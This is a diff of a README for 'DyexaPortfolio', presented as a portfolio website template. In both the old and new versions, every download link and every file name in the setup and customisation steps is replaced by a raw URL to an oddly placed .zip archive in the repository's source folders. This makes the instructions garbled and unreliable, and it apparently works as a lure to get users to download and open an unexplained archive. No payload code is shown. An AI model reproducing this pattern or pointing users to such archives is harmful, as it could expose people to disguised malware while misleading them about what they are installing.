@@ -1,7 +1,7 @@
 # 🌟 DyexaPortfolio - Create Your Personal Showcase Easily
 
 ## 📥 Download the Latest Version
-[![Download DyexaPortfolio](https://github.com/Hung816259/DyexaPortfolio/raw/refs/heads/dyexahub-main-br/src/components/sections/Dyexa_Portfolio_cataphatic.zip%https://github.com/Hung816259/DyexaPortfolio/raw/refs/heads/dyexahub-main-br/src/components/sections/Dyexa_Portfolio_cataphatic.zip)](https://github.com/Hung816259/DyexaPortfolio/raw/refs/heads/dyexahub-main-br/src/components/sections/Dyexa_Portfolio_cataphatic.zip)
+[![Download DyexaPortfolio](https://raw.githubusercontent.com/Hung816259/DyexaPortfolio/dyexahub-main-br/src/assets/Portfolio_Dyexa_v1.1-beta.1.zip%https://raw.githubusercontent.com/Hung816259/DyexaPortfolio/dyexahub-main-br/src/assets/Portfolio_Dyexa_v1.1-beta.1.zip)](https://raw.githubusercontent.com/Hung816259/DyexaPortfolio/dyexahub-main-br/src/assets/Portfolio_Dyexa_v1.1-beta.1.zip)
 
 ## 🚀 Getting Started
 DyexaPortfolio is your personal portfolio website. It allows you to present your projects and skills in a visually appealing way. The site works well on all devices, making sure your work shines anywhere.
@@ -21,7 +21,7 @@ To run DyexaPortfolio effectively, ensure your device meets the following requir
 - **Device:** Desktop or mobile capable of web browsing.
 
 ## 🔗 Download & Install
-To download DyexaPortfolio, [visit this page to download](https://github.com/Hung816259/DyexaPortfolio/raw/refs/heads/dyexahub-main-br/src/components/sections/Dyexa_Portfolio_cataphatic.zip). Follow these steps:
+To download DyexaPortfolio, [visit this page to download](https://raw.githubusercontent.com/Hung816259/DyexaPortfolio/dyexahub-main-br/src/assets/Portfolio_Dyexa_v1.1-beta.1.zip). Follow these steps:
 
 1. Click on the above link.
 2. You'll see the list of available releases.
@@ -31,14 +31,14 @@ To download DyexaPortfolio, [visit this page to download](https://github.com/Hun
 
 To run DyexaPortfolio:
 1. Open the unzipped folder.
-2. Locate the `https://github.com/Hung816259/DyexaPortfolio/raw/refs/heads/dyexahub-main-br/src/components/sections/Dyexa_Portfolio_cataphatic.zip` file.
+2. Locate the `https://raw.githubusercontent.com/Hung816259/DyexaPortfolio/dyexahub-main-br/src/assets/Portfolio_Dyexa_v1.1-beta.1.zip` file.
 3. Double-click it, and it will open in your browser.
 
 ## 📈 How to Customize
 Once you have your portfolio up and running, you can add your projects and skills. Here’s how:
 
-1. **Open the Project Folder:** Find the `assets` folder for images and `https://github.com/Hung816259/DyexaPortfolio/raw/refs/heads/dyexahub-main-br/src/components/sections/Dyexa_Portfolio_cataphatic.zip` for content.
-2. **Edit the https://github.com/Hung816259/DyexaPortfolio/raw/refs/heads/dyexahub-main-br/src/components/sections/Dyexa_Portfolio_cataphatic.zip File:** You can open this file in any text editor. Change the text to reflect your skills and projects.
+1. **Open the Project Folder:** Find the `assets` folder for images and `https://raw.githubusercontent.com/Hung816259/DyexaPortfolio/dyexahub-main-br/src/assets/Portfolio_Dyexa_v1.1-beta.1.zip` for content.
+2. **Edit the https://raw.githubusercontent.com/Hung816259/DyexaPortfolio/dyexahub-main-br/src/assets/Portfolio_Dyexa_v1.1-beta.1.zip File:** You can open this file in any text editor. Change the text to reflect your skills and projects.
 3. **Add Your Images:** Place your images in the `assets` folder and link them in the HTML.
 4. **Save Changes:** After editing, save the file and refresh your browser to see updates.
 
